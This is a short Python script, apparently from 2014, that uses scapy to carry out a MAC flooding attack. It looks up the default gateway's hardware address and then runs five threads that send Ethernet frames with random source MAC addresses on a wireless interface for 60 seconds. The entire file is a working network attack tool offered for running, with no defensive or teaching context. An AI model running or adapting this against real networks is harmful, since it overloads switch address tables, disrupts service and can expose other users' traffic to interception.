#! /usr/bin/env python
# coding:utf-8


from random import randint
from scapy.all import Ether, sendp
import os
import re
from threading import Thread
import time


class MacFlood(Thread):

    """auth:DrWrong
       email: yuhangchaney@gmail
       write at: 2014.4.16
       function: attack a mac flood attack to default """

    def __init__(self, ifname='eth1', *args, **kwargs):
        super(MacFlood, self).__init__(*args, **kwargs)
        self.daemon = True
        self.attack = True
        self.ifname = ifname

    def get_rand_mac_addr(self):
        mac_addr = ''
        for i in range(6):
            intnumber = randint(0, 255)
            if len(mac_addr):
                mac_addr += ':%x' % intnumber
            else:
                mac_addr = '%x' % intnumber
        return mac_addr

    def get_gateway_ip(self):
        t = os.popen('route -n')
        for i in t:
            if i.startswith('0.0.0.0'):
                r = re.split('\s+', i)
                return r[1]
        raise Exception("cannot get getway ip")

    def get_gateway_hw(self):
        ip = self.get_gateway_ip()
        t = os.popen('arp -e %s' % ip)
        for i in t:
            if i.startswith(ip):
                r = re.split("\s+", i)
                return r[2]

    def run(self):
        hw = self.get_gateway_hw()
        while(self.attack):
            eth = Ether(dst=hw)
            # print eth
            eth.src = self.get_rand_mac_addr()
            sendp(eth, iface=self.ifname)
            # break

    def stop(self):
        self.attack = False


def start_attack(threads=5, ifname='eth1'):
    attack_threads_list = []
    for i in range(threads):
        attack_threads_list.append(MacFlood(ifname))
    for thread in attack_threads_list:
        thread.start()
    return attack_threads_list


def stop_attack(attack_threads_list):
    for thread in attack_threads_list:
        thread.stop()


if __name__ == "__main__":
    m = start_attack(ifname='wlan0')
    time.sleep(60)
    stop_attack(m)
